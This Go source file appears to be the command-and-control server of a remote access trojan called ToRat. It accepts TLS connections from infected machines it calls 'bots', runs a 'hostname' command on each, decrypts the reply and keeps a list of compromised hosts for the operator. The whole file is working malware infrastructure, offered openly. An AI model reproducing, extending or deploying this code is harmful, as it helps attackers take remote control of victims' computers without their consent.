package server

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"path/filepath"
	"strconv"

	"github.com/fatih/color"
	"github.com/lu4p/ToRat_server/crypto"
)

const port = "127.0.0.1:1337"

var allClients []*client

type client struct {
	Conn     net.Conn
	Hostname string
	Name     string
	Path     string
}

func Start() {
	cert, err := tls.LoadX509KeyPair("cert.pem", "key.pem")
	if err != nil {
		log.Println("could not load cert", err)
		return
	}
	config := tls.Config{Certificates: []tls.Certificate{cert}}
	ln, err := net.Listen("tcp", port)
	if err != nil {
		fmt.Println(err)
		return
	}
	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Println("accepting failed:", err)
			continue
		}
		//log.Println("got new connection")
		tlsconn := tls.Server(conn, &config)
		go accept(tlsconn)
	}
}

func accept(conn net.Conn) {
	c := new(client)
	c.Conn = conn
	encHostname, err := c.runCommandByte("hostname")
	if err != nil {
		log.Println("Invalid Hostname", err)
		return
	}
	hostname, err := crypto.DecAsym(encHostname)
	if err != nil {
		log.Println("Invalid Hostname", err)
		return
	}
	c.Hostname = string(hostname)
	c.Path = filepath.Join("bots", c.Hostname)
	if _, err = os.Stat(c.Path); err != nil {
		os.MkdirAll(c.Path, os.ModePerm)
	}
	name, err := ioutil.ReadFile(filepath.Join(c.Path, "alias"))
	if err != nil {
		c.Name = c.Hostname
	}
	c.Name = string(name)

	allClients = append(allClients, c)
	fmt.Println(green("[+] New Client"), blue(c.Hostname), green("connected!"))
}

func listConn() []string {
	var clients []string
	for i, client := range allClients {
		str := strconv.Itoa(i) + "\t" + client.Hostname + "\t" + client.Name
		clients = append(clients, str)
	}
	return clients

}

func printClients() {
	color.HiCyan("Clients:")
	list := listConn()
	for _, client := range list {
		color.Cyan(client)
	}

}

func getClient(target int) *client {
	return allClients[target]
}
